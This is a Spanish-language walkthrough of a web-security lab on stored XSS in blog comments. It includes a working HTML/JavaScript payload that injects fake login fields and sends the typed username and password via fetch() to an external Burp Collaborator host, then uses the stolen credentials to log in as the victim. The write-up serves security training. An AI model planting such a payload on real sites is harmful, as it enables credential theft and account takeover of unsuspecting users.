# 🌐 Captura de contraseñas mediante XSS

## 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **XSS almacenado** en la funcionalidad de comentarios del blog.

Un usuario víctima simulado visualiza todos los comentarios después de que se publican. El objetivo es capturar sus credenciales (usuario y contraseña) y utilizarlas para iniciar sesión como la víctima, empleando **Burp Collaborator** como canal de exfiltración.

Objetivo del laboratorio: extraer el nombre de usuario y la contraseña de la víctima mediante XSS almacenado y usar esas credenciales para autenticarnos.



## 📚 Teoría

### 📌 Credential harvesting mediante XSS

En este laboratorio se explota un **XSS almacenado** para realizar **credential harvesting**, es decir, capturar directamente las credenciales del usuario.

El flujo vulnerable es el siguiente:

1. La aplicación permite almacenar comentarios sin una sanitización adecuada.
2. El contenido del comentario se renderiza posteriormente en la página.
3. Un usuario víctima visita la sección de comentarios.
4. El navegador ejecuta el JavaScript inyectado por el atacante.
5. El atacante puede modificar el DOM de la página.
6. Se presentan campos falsos para capturar credenciales.
7. Los valores introducidos se envían a un servidor externo controlado por el atacante.

A diferencia del robo de cookies, este enfoque permite obtener **credenciales válidas** del usuario, lo que tiene implicaciones más graves:

* No depende de la cookie de sesión.
* No se ve afectado por flags como `HttpOnly`.
* Permite comprometer la cuenta incluso si la sesión actual expira.

Este tipo de ataque combina una vulnerabilidad técnica (XSS) con ingeniería social para inducir al usuario a revelar información sensible.



## 📝 Práctica

### 1️⃣ Preparar Burp Collaborator

Abrimos **Burp Collaborator** desde Burp Suite y generamos un subdominio único.

Ejemplo:

```
https://oogeha2iq5zu341vbmssarpndej67wvl.oastify.com
```

Este dominio se utilizará para recibir las peticiones enviadas desde el navegador de la víctima.



### 2️⃣ Diseñar el formulario malicioso

Sabemos que:

* La víctima visita la sección de comentarios.
* El contenido del comentario se ejecuta en su navegador.
* Podemos insertar HTML y JavaScript arbitrario.

El objetivo es crear un formulario que capture las credenciales introducidas por el usuario.

Payload utilizado:

```html
Introduce tus credenciales para ver el post:<br><br>

Usuario:
<input name="username" id="username"
onchange="fetch('https://oogeha2iq5zu341vbmssarpndej67wvl.oastify.com?username=' + this.value)">
<br><br>

Password:
<input type="password" name="password"
onchange="fetch('https://oogeha2iq5zu341vbmssarpndej67wvl.oastify.com?password=' + this.value)">
```

Funcionamiento del payload:

1. Se crean dos campos de entrada visibles en la página.
2. Cuando el usuario introduce datos, se dispara el evento `onchange`.
3. El valor introducido se envía al servidor del atacante mediante `fetch()`.



### 3️⃣ Publicar el comentario malicioso

Publicamos el comentario con el payload anterior en la sección de comentarios del blog.

En este momento no ocurre nada visible, ya que el código espera que el usuario interactúe con los campos creados.



### 4️⃣ Capturar las credenciales en Burp Collaborator

Cuando la víctima visita la página e introduce sus credenciales:

1. El navegador ejecuta las peticiones `fetch`.
2. Se envían solicitudes HTTP al dominio del Collaborator.

Volvemos a **Burp Collaborator** y pulsamos **Poll now**.

### 5️⃣ Autenticarse como la víctima

Con las credenciales obtenidas:

1. Accedemos al formulario de login de la aplicación.
2. Introducimos el usuario y la contraseña capturados.
3. Enviamos el formulario.

Resultado:

La aplicación nos autentica como la víctima y el laboratorio se marca como completado.



### 6️⃣ Resultado

Se consigue:

* Ejecutar código JavaScript mediante XSS almacenado.
* Crear un formulario malicioso dentro del DOM.
* Capturar credenciales de usuario.
* Exfiltrar los datos mediante Burp Collaborator.
* Utilizar las credenciales para suplantar la cuenta de la víctima.
